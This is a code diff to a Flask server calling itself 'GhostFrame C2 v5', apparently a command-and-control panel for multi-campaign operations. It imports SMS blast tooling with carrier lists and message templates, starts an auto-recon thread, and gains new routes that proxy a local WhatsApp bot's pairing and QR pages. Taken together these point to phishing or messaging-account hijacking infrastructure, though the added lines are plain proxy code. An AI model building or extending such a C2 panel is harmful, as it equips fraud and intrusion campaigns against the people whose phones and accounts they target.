@@ -4,7 +4,7 @@ GhostFrame C2 v5 — HTTP REST + Auto-Recon + Multi-Campaign + Short Routes
 """
 import os, json, uuid, time, threading, re
 from datetime import datetime, timedelta
-from flask import Flask, request, jsonify, render_template, send_from_directory
+from flask import Flask, request, jsonify, render_template, send_from_directory, Response
 
 try:
     from sms_gateway import send_sms, send_blast, get_sms_log, get_operadoras, get_templates, configure_smtp, test_smtp
@@ -529,6 +529,46 @@ def api_sms_test():
     if not SMS_AVAILABLE:
         return jsonify({"ok": False, "error": "sms_gateway module not installed"})
     return jsonify(test_smtp())
+
+def _wa_proxy(path, method="GET", body=None):
+    import urllib.request
+    import urllib.error
+    url = "http://127.0.0.1:8554" + path
+    req = urllib.request.Request(url, method=method, data=body,
+        headers={"Content-Type": "application/json", "User-Agent": "gf-c2/5.0"})
+    try:
+        r = urllib.request.urlopen(req, timeout=10)
+        return r.status, r.read(), r.headers.get("Content-Type", "text/html")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read(), e.headers.get("Content-Type", "application/json")
+    except Exception:
+        return 502, json.dumps({"ok": False, "error": "whatsapp bot offline"}).encode(), "application/json"
+
+
+@app.route("/whatsapp-pair")
+def wa_pair_page():
+    st, data, ct = _wa_proxy("/whatsapp-pair")
+    return Response(data, status=st, content_type=ct)
+
+
+@app.route("/whatsapp")
+def wa_qr_page():
+    st, data, ct = _wa_proxy("/whatsapp")
+    return Response(data, status=st, content_type=ct)
+
+
+@app.route("/api/whatsapp-status")
+def wa_status():
+    st, data, ct = _wa_proxy("/api/whatsapp-status")
+    return Response(data, status=st, content_type=ct)
+
+
+@app.route("/api/whatsapp-pair", methods=["POST", "GET"])
+def wa_pair():
+    body = request.get_data()
+    st, data, ct = _wa_proxy("/api/whatsapp-pair", method=request.method, body=body or None)
+    return Response(data, status=st, content_type=ct)
+
 
 if __name__ == "__main__":
     t = threading.Thread(target=auto_recon_loop, daemon=True)
